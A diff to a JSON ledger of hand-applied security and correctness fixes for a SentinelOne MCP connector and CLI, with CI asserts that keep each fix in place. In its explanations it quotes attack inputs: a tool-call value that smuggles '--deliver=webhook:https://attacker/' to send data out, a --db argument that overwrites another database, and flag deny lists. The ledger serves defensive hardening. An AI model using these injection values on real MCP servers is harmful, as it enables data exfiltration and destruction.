@@ -4,9 +4,36 @@
  "_comment": "Connector-specific edits to GENERATED/authored files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one.",
  "handfixes": [
   {
+   "id": "auth-header-apitoken-prefix",
+   "summary": "AuthHeader() sends the token as `Authorization: ApiToken <token>`; the press emits the bare token",
+   "why": "SentinelOne rejects a bare token: every management API call must carry `Authorization: ApiToken <token>`. The spec declares this (`x-auth-value-prefix: 'ApiToken '` on the APIToken securityScheme) but cli-printing-press does not consume that extension - still true at 4.32.5, which emits `return token` - so every reprint regenerates config.go with broken live auth while go build, go test, shipcheck and dogfood all stay green (the 2026-06-05 4.22 reprint and the 4.24 reprint both re-hit it; only a reviewer reading client.go caught it). The guard also tolerates an operator who pasted the prefix themselves (no double prefix). authheader_test.go pins both directions. This was a silent hand-fix from the first print onward; recorded on the 4.32.5 reprint (2026-09-28).",
+   "status": "active",
+   "spec_encode_followup": "cli-printing-press should honor x-auth-value-prefix when emitting AuthHeader() for api_key schemes; then this entry flips to upstreamed.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "return \"ApiToken \" + token",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "strings.HasPrefix(strings.ToLower(token), \"apitoken \")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/authheader_test.go",
+     "contains": "func TestAuthHeaderApiTokenPrefix(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
    "id": "doctor-verdict-tracks-reality",
    "summary": "doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential",
-   "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.",
+   "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282. UPDATE 2026-09-28 (reprint to cli-printing-press 4.32.5): the press now emits doctorInfoKeys/doctorIsInfoKey and the --fail-on info-key skip natively, and no longer emits the \"but auth was accepted\" line; doctor_verdict.go therefore drops its own copy of the info-key map (it merges the three connector keys the native map lacks in an init()), while the placeholder refusal, the no-credential ERROR row and doctorUnexpectedStatus remain hand-wired into doctor.go.",
    "status": "active",
    "asserts": [
     {
@@ -36,13 +63,19 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "doctorInfoKeys[k] = true",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
   {
    "id": "install-credentials-declared-on-every-channel",
    "summary": "every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)",
-   "why": "Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For sentinelone the manifest gained: SENTINELONE_BASE_URL. server.json gained: SENTINELONE_BASE_URL. mcp-install.md's env blocks gained: SENTINELONE_BASE_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out.",
+   "why": "Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For sentinelone the manifest gained: SENTINELONE_BASE_URL. server.json gained: SENTINELONE_BASE_URL. mcp-install.md's env blocks gained: SENTINELONE_BASE_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out. UPDATE 2026-09-28 (reprint to cli-printing-press 4.32.5): the 4.32 binary also reads SENTINELONE_MCP_HTTP_TOKEN (cmd/sentinelone-mcp/main.go, bearer for --transport http) and PRINTING_PRESS_CLIENT_PROFILE (internal/platform/profile.go, tenant-gated client profile); both are declared optional on all three channels, following the datagate/threatlocker shape, because check_env_schema.py (hard-fail in the CI guards job) treats an undeclared read as a credential nobody is prompted for. The 4.32 binary also reads SENTINELONE_USER_AGENT (cliutil.EnvOverride in internal/client/client.go and internal/cli/deliver.go, an optional User-Agent override); it is declared optional on all three channels following the huntress 4.32.5 shape. check_env_schema.py only sees this read once it resolves package-qualified helpers (cliutil.EnvOverride) - the same resolution that turns SENTINELONE_BASE_URL from a false 'declared but never read' into a read.",
    "status": "active",
    "spec_encode_followup": "cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.",
    "asserts": [
@@ -75,13 +108,58 @@
      "file": "mcp-install.md",
      "contains": "\"SENTINELONE_BASE_URL\":",
      "min_count": 3
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"SENTINELONE_MCP_HTTP_TOKEN\": \"${user_config.sentinelone_mcp_http_token}\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"PRINTING_PRESS_CLIENT_PROFILE\": \"${user_config.printing_press_client_profile}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"SENTINELONE_MCP_HTTP_TOKEN\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"PRINTING_PRESS_CLIENT_PROFILE\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"SENTINELONE_MCP_HTTP_TOKEN\":",
+     "min_count": 3
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"PRINTING_PRESS_CLIENT_PROFILE\":",
+     "min_count": 3
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"SENTINELONE_USER_AGENT\": \"${user_config.sentinelone_user_agent}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"SENTINELONE_USER_AGENT\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"SENTINELONE_USER_AGENT\":",
+     "min_count": 3
     }
    ]
   },
   {
    "id": "mcp-filesystem-destination-gate",
    "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
+   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect. UPDATE 2026-09-28 (reprint to cli-printing-press 4.32.5): the press now emits blockedDestinationFlags and the argument-name \"=\" guard natively, in the 4.30 shape this entry asked for (typemap.go blockedStructuredArgsForCommand unions blockedDestinationFlags into the per-command blocked set, and the blocked names are removed from the tool schema). Its native floor lists only 5 names (audit-dir, db, o, output, receipt-file), so the 13-name floor is re-applied as a union. Still hand-carried, not in the press: filesystemPathFlagPhrases, vendorAPIPathFlags, isFilesystemPathFlag, UnblockedFilesystemPathFlags and the three test functions. The former assert on the literal `blockedDestinationFlags[k]` (the pre-4.30 cliArgsFromMCP consumption) is replaced by the native consumption site in typemap.go.",
    "status": "active",
    "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
    "asserts": [
@@ -92,7 +170,17 @@
     },
     {
      "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
+     "contains": "\"home\":                true,",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "var filesystemPathFlagPhrases = []string{",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/typemap.go",
+     "contains": "for name := range blockedDestinationFlags {",
      "min_count": 1
     },
     {
@@ -130,8 +218,8 @@
   {
    "id": "mcp-argv-value-joined",
    "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
+   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot. UPDATE 2026-09-28 (reprint to cli-printing-press 4.32.5): the press now emits the joined form natively (shellout.go.tmpl carries the same four lines and TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag), so status is upstreamed; the asserts stay, and the \"--filter=map[a:1]\" every-branch table now lives in the hand-appended TestCliArgsFromMCP_EveryValueBranchEmitsOneElement because the native test does not cover the default branch.",
+   "status": "upstreamed",
    "asserts": [
     {
      "file": "cli/internal/mcp/cobratree/shellout.go",
@@ -172,6 +260,103 @@
      "contains": "\"--filter=map[a:1]\"",
      "min_count": 1,
      "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-http-read-header-timeout",
+   "summary": "The MCP server's --transport http listener sets ReadHeaderTimeout so one client cannot hold it open by dribbling request headers",
+   "why": "cli-printing-press 4.32.5 gives every MCP server a --transport http mode (streamable HTTP behind bearer auth) and the generated cmd/sentinelone-mcp/main.go http.Server literal sets no header-read deadline, so a single client could hold the listener open indefinitely by sending request headers one byte at a time (Slowloris). gosec G112 flags exactly this shape and the security gate raised it as P1 on the 4.32.5 reprint (2026-09-28; same finding and fix as the huntress 4.32.5 pilot and datagate since PR #317). The fix adds ReadHeaderTimeout: 10 * time.Second to the http.Server literal. A reprint regenerates main.go without the field and go build stays green, so this marker is the only thing that notices. code_only because the explanatory comment above the field also names G112 - the assert must be satisfied by the field itself. DURABLE FIX belongs in the press's mcp main.go template; file via printing-press-retro.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/cmd/sentinelone-mcp/main.go",
+     "contains": "ReadHeaderTimeout: 10 * time.Second,",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "firewall-control-renamed-by-category",
+   "summary": "firewall-control copy-rules / move-rules / set-location refuse stray positionals, and name the new `item-<name> by-category` path when the pre-reprint spelling `<name> by-category` is used",
+   "why": "On cli-printing-press 4.24 the generator registered two constructors under the same name in firewall-control, so `copy-rules`, `move-rules` and `set-location` were groups whose only child was `by-category` and the leaf endpoints were unreachable. The 4.32.5 reprint (2026-09-28) disambiguated them: the three names are now the leaf POST endpoints and the by-category operations moved to `firewall-control item-<name> by-category`. The generated leaf commands accept and ignore positionals, so a script still typing `firewall-control move-rules by-category --stdin` silently POSTed its body to a different mutation (/firewall-control/move-rules) - found by the Codex review of the reprint (P1). firewallControlLeafArgs rejects any positional before a request is built. A reprint regenerates the three leaf files without the Args line and go build stays green; these asserts notice. TestFirewallControlOldSpellingSendsNothing proves the old spelling sends zero requests (it fails, with one request sent, when the Args line is removed) and TestFirewallControlOldBySpellingIsRefused proves the bare leaf and the new item-* path still resolve.",
+   "status": "active",
+   "spec_encode_followup": "cli-printing-press should emit Args: cobra.NoArgs on endpoint commands that declare no positionals, which would make a mistyped subcommand an error fleet-wide; this entry then reduces to the migration message.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/firewall-control_copy-rules.go",
+     "contains": "Args:        firewallControlLeafArgs(\"copy-rules\"),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/firewall-control_move-rules.go",
+     "contains": "Args:        firewallControlLeafArgs(\"move-rules\"),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/firewall-control_set-location.go",
+     "contains": "Args:        firewallControlLeafArgs(\"set-location\"),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/firewall_control_compat.go",
+     "contains": "func firewallControlLeafArgs(name string) cobra.PositionalArgs {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/firewall_control_compat_test.go",
+     "contains": "func TestFirewallControlOldSpellingSendsNothing(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "login-by-token-example-not-a-token",
+   "summary": "`users login-by-token --token` help text shows `<your-user-token>` instead of the 80-hex-character sample token the vendor spec carries",
+   "why": "The SentinelOne spec's example for the login-by-token `token` parameter is a real-looking 80-character hex user token, and cli-printing-press copies spec examples verbatim into flag usage text. gitleaks (generic-api-key, the CI guards job) fails the build on it, and it teaches operators and agents to paste a token-shaped literal. The 0.1.x tree carried this as an unrecorded hand-edit; the 4.32.5 reprint (2026-09-28) regenerated the file and silently restored the sample, which only the guards job's gitleaks step caught. code_only so the assert is satisfied by the usage string itself.",
+   "status": "active",
+   "spec_encode_followup": "Replace the example in the vendored spec (or have the press redact token-shaped examples on credential parameters); then this entry flips to upstreamed.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/users_login-by-token.go",
+     "contains": "User token. Example: '<your-user-token>'.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/users_login-by-token.go",
+     "not_contains": "bfd9070c1afa88516d3cdfd722e62fe433e42bad"
+    }
+   ]
+  },
+  {
+   "id": "mcp-server-version-from-ldflags",
+   "summary": "cmd/sentinelone-mcp/main.go declares `var version = \"0.0.0-dev\"` and passes it to server.NewMCPServer, so release.yml's `-X main.version=<tag>` stamps the real release into serverInfo.version (issue #322, PR #323)",
+   "why": "The 4.32.5 reprint graft (PR #343) dropped the `var version` declaration and hardcoded \"0.0.0-dev\" in the NewMCPServer call, although the press template main_mcp.go.tmpl at v4.32.5 emits the var. The Go linker silently ignores -X for a symbol that does not exist (build exit 0, no warning), so release.yml's stamp could never land; the Release run for sentinelone-v0.2.0 (https://github.com/Servosity/msp-skills/actions/runs/36472932792) refused the build when the initialize probe answered serverInfo.version='0.0.0-dev', and 0.2.0 was burned. Proven locally with a real initialize JSON-RPC over stdio: after the fix `go build -ldflags '-X main.version=9.9.9'` answers 9.9.9. code_only because the explanatory comment above the var names the ldflags mechanism; the assert must be satisfied by the declaration itself.",
+   "status": "active",
+   "spec_encode_followup": "None needed at the press: main_mcp.go.tmpl already emits the var and passes it. The loss was in the reprint graft, so this entry guards the next graft; retire it after a reprint confirms the var survives natively.",
+   "asserts": [
+    {
+     "file": "cli/cmd/sentinelone-mcp/main.go",
+     "contains": "var version = \"0.0.0-dev\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/sentinelone-mcp/main.go",
+     "contains": "\t\tversion,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/sentinelone-mcp/main.go",
+     "not_contains": "\t\t\"0.0.0-dev\","
     }
    ]
   }
